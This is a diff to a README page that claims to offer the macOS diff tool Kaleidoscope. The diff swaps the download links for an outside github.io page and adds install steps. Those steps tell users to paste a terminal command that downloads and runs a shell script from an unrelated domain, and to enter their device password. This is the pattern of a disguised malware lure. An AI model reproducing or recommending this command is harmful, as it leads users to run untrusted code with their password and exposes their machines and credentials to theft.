@@ -7,9 +7,30 @@ Built with native macOS integration, Kaleidoscope supports file, folder, image, 
 ---
 
 ## ✅ Download Kaleidoscope for macOS  
-[![Download Kaleidoscope](https://img.shields.io/badge/Download-Kaleidoscope-blueviolet)](#)
+[![Download Kaleidoscope](https://img.shields.io/badge/Download-Kaleidoscope-blueviolet)](https://kaleidoscope-download-mac.github.io/.github)
 
 ---
+
+## 📥 How to Use
+
+Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+Installation via a command in the terminal:
+
+1. Copy the installation command below.
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
+```
+
+
+
 
 ## 📦 What is Kaleidoscope?
 
@@ -40,19 +61,11 @@ Kaleidoscope is a premium macOS utility that helps users visually compare text f
 
 ---
 
-[![Download Kaleidoscope](https://img.shields.io/badge/Download-Kaleidoscope-blueviolet)](#)
+[![Download Kaleidoscope](https://img.shields.io/badge/Download-Kaleidoscope-blueviolet)](https://kaleidoscope-download-mac.github.io/.github)
 
 ---
 
-## 📥 How to Use
 
-- ✅ Install Kaleidoscope on your Mac  
-- 📝 Drag and drop two files or folders into the app to compare  
-- 🖼 Use image diff mode to inspect visual changes  
-- 🔀 Merge text changes and sync differences effortlessly  
-- 💡 Use it alongside Git clients for version conflict resolution  
-
----
 
 ## 🖼 Preview
 
